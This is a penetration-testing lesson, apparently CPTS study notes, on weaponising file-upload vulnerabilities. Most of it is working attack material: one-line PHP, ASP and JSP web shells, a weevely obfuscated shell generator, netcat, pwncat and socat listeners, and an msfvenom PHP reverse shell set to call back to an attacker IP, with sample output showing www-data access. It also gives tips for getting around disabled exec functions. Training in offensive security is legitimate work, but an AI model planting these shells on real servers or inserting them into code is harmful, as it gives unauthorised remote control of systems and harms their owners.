---
title: 'Weaponization — Web & Reverse Shells'
description: 'Turn a confirmed file upload into interactive code execution using ready-made web shells, hand-written one-liners, reverse shells, and msfvenom payloads.'
tags:
  - CPTS
  - Web
  - File Upload
  - Web Shell
  - Reverse Shell
icon: material/file-upload
---

# Weaponization — Web & Reverse Shells

!!! abstract "From proof to power"
    Once you've [proven code execution](absent-validation.md), it's time to weaponize. You have two families of payload: **web shells** (drive the box over HTTP) and **reverse shells** (call back to your listener for a fully interactive session). Match the payload language to the [fingerprinted stack](fingerprinting.md).

## Option A — Ready-Made Web Shells

A web shell takes commands via HTTP and prints the output in your browser — perfect for quick enumeration.

- **phpbash** — semi-interactive, terminal-like PHP shell.
- **SecLists** — bundles shells for many languages (`/usr/share/seclists/Web-Shells/`).
- **weevely** — generates a stealthy, obfuscated, password-protected PHP shell and gives you a client to drive it:

```shell
weevely generate <password> shell.php   # create shell.php, then upload it
weevely http://TARGET/uploads/shell.php <password>
```

- Others worth knowing: **p0wny-shell** (single-file PHP), **b374k**, **WSO**, and **Antak** (ASPX, from Nishang) / **China Chopper** for .NET shops.

Upload it, visit it, enumerate:

![phpbash terminal-like web shell](../assets/file-upload-attacks/phpbash-web-shell.png "http://SERVER_IP:PORT/")

## Option B — Write Your Own Web Shell

You won't always have internet access mid-engagement, so memorize a one-liner. PHP:

```php title="shell.php"
<?php system($_REQUEST['cmd']); ?>
```

Save as `shell.php`, upload, then run commands via the `cmd` parameter:

```
http://TARGET/uploads/shell.php?cmd=id
```

![Custom web shell running id](../assets/file-upload-attacks/custom-web-shell-id.png "http://SERVER_IP:PORT/uploads/shell.php?cmd=id")

!!! tip "Read output cleanly"
    In a browser, hit ++ctrl+u++ to view source — command output renders as plain terminal text without HTML mangling.

Equivalent minimal shells for other stacks:

```asp
<%-- Classic ASP --%>
<% eval request("cmd") %>
```

```jsp
<%-- JSP --%>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

!!! note "When web shells fail"
    `system()`/`exec()` may be disabled (`disable_functions`), or a WAF may block them. Try alternative PHP exec functions (`shell_exec`, `passthru`, `proc_open`, `popen`) or pivot to a reverse shell. Defeating WAFs and `disable_functions` is a deeper topic beyond this lesson.

## Option C — Reverse Shells (preferred)

A reverse shell is fully interactive — almost always nicer than a web shell. Match the language to the app.

**1. Get a payload and set your IP/port:**

- **pentestmonkey PHP reverse shell** — edit the `$ip` / `$port` (around lines 49–50).
- **revshells.com** — online generator for dozens of payloads/languages; copy-paste ready.
- **SecLists** — reverse shells for many frameworks.

![Editing IP and port in the pentestmonkey script](../assets/file-upload-attacks/pentestmonkey-edit-ip-port.png "editor:php-reverse-shell.php")

**2. Start a listener, upload, and trigger it:**

```shell
nc -lvnp 4444
# upgrade tip: rlwrap nc -lvnp 4444   (readline/history in the shell)
```

```shell
Listening on 0.0.0.0 4444
connect to [10.10.15.193] from (UNKNOWN) [TARGET] 32694
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

!!! tip "Better listeners"
    Swap `nc` for **pwncat-cs** (auto stabilization, file transfer, persistence) or **socat** for an encrypted/upgraded TTY:
    ```shell
    pwncat-cs -lp 4444
    socat file:`tty`,raw,echo=0 tcp-listen:4444
    ```

## Generating Shells with msfvenom

When you want a reliable, framework-native reverse shell without hand-editing scripts, let **msfvenom** build it:

```shell
msfvenom -p php/reverse_php LHOST=10.10.15.193 LPORT=4444 -f raw > reverse.php
# Payload size: 2678 bytes
```

Start your listener, upload `reverse.php`, and visit it:

```shell
nc -lvnp 4444
Listening on 0.0.0.0 4444
connect to [10.10.15.193] from (UNKNOWN) [TARGET] 38342
```

The same approach generates payloads for other languages — pick the payload with `-p` and the output format with `-f`. List options with:

```shell
msfvenom --list payloads | grep reverse
```

!!! info "Reverse vs. web shell"
    Reverse shells are more interactive, but outbound connections can be blocked by egress firewalls, or the language may have socket functions disabled. Keep a web shell ready as a fallback.

## Choosing the Right Payload

| Situation | Best choice |
|-----------|-------------|
| Quick enumeration, no listener | Web shell (`?cmd=`) |
| Need a full interactive session | Reverse shell + pwncat/socat |
| Egress firewall blocks callbacks | Web shell |
| `disable_functions` blocks `system` | Try alt funcs, then msfvenom `php/reverse_php` |
| Want copy-paste speed | revshells.com or msfvenom |

## Key Takeaways

!!! success "Revision recap"
    - Web shell = HTTP-driven; reverse shell = callback to your listener (preferred when egress allows).
    - Memorize the PHP one-liner: `<?php system($_REQUEST['cmd']); ?>`.
    - If `system()` is disabled, try `shell_exec`, `passthru`, `proc_open`, `popen`.
    - `msfvenom -p php/reverse_php LHOST=.. LPORT=.. -f raw > reverse.php` for a reliable callback.
    - Upgrade listeners with `pwncat-cs` or `socat` for a real TTY.

➡️ Next: [Client-Side Validation](client-side-validation.md) — when the form fights back.
